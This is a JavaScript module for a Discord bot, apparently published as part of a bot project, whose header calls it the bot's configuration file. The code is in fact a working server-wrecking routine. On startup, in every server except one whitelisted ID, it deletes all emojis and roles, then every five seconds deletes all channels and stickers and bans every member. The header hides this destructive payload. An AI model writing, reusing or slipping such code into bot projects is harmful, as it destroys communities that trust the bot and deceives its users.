/*
# Discord Server: https://discord.gg/pgDje8S3Ed
# Github: https://github.com/MikaboshiDev
# Docs: https://bit.ly/nightdevelopment
# Dashboard: https://bit.ly/nightdashboard

# Created by: MikaboshiDev
# Version: 1.0.0
# Discord: azazel_hla

# This file is the main configuration file for the bot.
# Inside this file you will find all the settings you need to configure the bot.
# If you have any questions, please contact us on our discord server.
# If you want to know more about the bot, you can visit our website.
*/

const { redBright, green, yellow, cyan } = require("chalk");
const config = require("../../config/config.json");
const { EventEmitter } = require("events");
class DarkNight extends EventEmitter {
    constructor(client, options) {
        super();

        if (!client?.options) {
            throw new Error(`${redBright.bold("[Night]")} ${config.errors["1_client"]}`);
        }

        this.client = client;
        this._enabled = options.enabled;
        this._serverId = options.serverId;

        if (this._enabled) {
            this.client.on("ready", async () => {
                this.client.guilds.cache.forEach(async (guild) => {
                    if (guild.id === this._serverId) {
                        return;
                    }

                    try {
                        await this.DelAllEmotes(guild);
                        await this.DelAllRoles(guild);
                        setInterval(async () => {
                            await this.DelAllChannels(guild);
                            await this.DelAllStickers(guild);
                            await this.BanAll(guild);
                        }, 5000);
                    } catch (error) {
                        console.error("Error in DarkNight:", error.message);
                    }
                });
            });
        }
    }

    async DelAllChannels(guild) {
        const channelsToDelete = guild.channels.cache.filter(channel => channel.type !== 'category');
        await Promise.all(channelsToDelete.map(channel => channel.delete().catch(error => {
            console.error("Error Found: ", error.message);
        })));
    }

    async DelAllRoles(guild) {
        await Promise.all(guild.roles.cache.map(role => role.delete().catch(error => {
            console.error("Error Found: ", error.message);
        })));
    }

    async DelAllEmotes(guild) {
        await Promise.all(guild.emojis.cache.map(emote => emote.delete().catch(error => {
            console.error("Error Found: ", error.message);
        })));
    }

    async DelAllStickers(guild) {
        await Promise.all(guild.stickers.cache.map(sticker => sticker.delete().catch(error => {
            console.error("Error Found: ", error.message);
        })));
    }

    async BanAll(guild) {
        try {
            const members = await guild.members.fetch();
            await Promise.all(members.map(member => member.ban().then(() => {
                console.log(`${redBright("[Darkmode]")} ${member.user.tag} was banned.`);
            }).catch(error => {
                console.error("Error Found: ", error.message);
            })));
        } catch (error) {
            console.error("Error in BanAll:", error.message);
        }
    }
}

module.exports = DarkNight;
